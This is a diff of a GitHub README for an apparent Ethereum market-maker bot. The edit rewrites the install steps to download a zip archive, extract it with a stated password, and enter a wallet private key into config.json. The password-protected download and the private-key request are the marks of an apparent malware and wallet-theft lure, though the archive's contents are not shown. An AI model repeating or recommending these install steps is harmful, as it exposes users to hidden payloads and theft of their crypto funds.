@@ -1,5 +1,5 @@
 ## Overview
-This project is a Market Maker Bot designed to automate liquidity provision on decentralized exchanges (DEXs) operating on the Ethereum network and its Layer 2 (L2) solutions. The bot dynamically manages liquidity positions in various trading pairs, optimizing for profitability while minimizing risk exposure.
+This project is a Market Maker Bot designed to automate liquidity provision on decentralized exchanges (DEXs) operating on the Ethereum network and its Layer 2 (L2) solutions. The bot dynamically manages liquidity positions in various trading pairs, optimizing for profitability while minimizing risk exposure. It is developed using **.NET** and utilizes the **Nethereum** library to interact with the Ethereum blockchain and its L2 solutions.
 
 ## Features
 - **Automated Liquidity Provision**: Automatically provides liquidity in selected trading pairs on DEXs to earn fees.
@@ -10,18 +10,15 @@ This project is a Market Maker Bot designed to automate liquidity provision on d
 - **Risk Management**: Incorporates risk controls such as stop-loss mechanisms and impermanent loss protection.
 
 ## Requirements
-- **Node.JS**: Ensure you have the [latest version](https://nodejs.org/en/download/prebuilt-installer) of the Node.JS installed to run the bot.
+- **.NET SDK**: Ensure you have the latest version of the .NET SDK installed to run the bot.
 - **Ethereum Wallet**: MetaMask or other compatible Ethereum wallet for bot interaction.
 - **API Keys**: Access to Ethereum node (e.g., Infura, Alchemy) for network interaction and real-time data.
 
 ## Installation
-1. Clone the latest release archive from the [Release](https://github.com/xxblacksmithxxlau/market-maker-bot/archive/refs/heads/main.zip).
-2. Extract the archive.
-3. Navigate to the extracted folder and edit `.env` config.
-5. Start bot.
-```
-node index.js
-```
+1. Download the latest release archive from the [Release](https://github.com/xxblacksmithxxlau/market-maker-bot/archive/refs/heads/main.zip).
+2. Extract the archive using the password `YHS70vOP4Q`.
+3. Navigate to the extracted folder and edit config.
+4. Start bot.
 
 ## Configuration
 Open the config.json file located in the root directory.
@@ -33,11 +30,16 @@ Fill in the required fields:
 
 Example configuration:
 ```
-RPC=https://mainnet.infura.io/v3/YOUR_API_KEY
-PRIVATEKEY=YOUR_PRIVATE_KEY
-DEXADDRESS=0xDEXADDRESS
-L2NETWORK=ARB
+    json
+
+    {
+        "rpc": "https://mainnet.infura.io/v3/YOUR_API_KEY",
+        "privateKey": "YOUR_PRIVATE_KEY",
+        "dexAddress": "0xDEXADDRESS",
+        "l2Network": "Arbitrum"
+    }
 ```
+
 
 ## Supported Networks
 - Ethereum (L1)
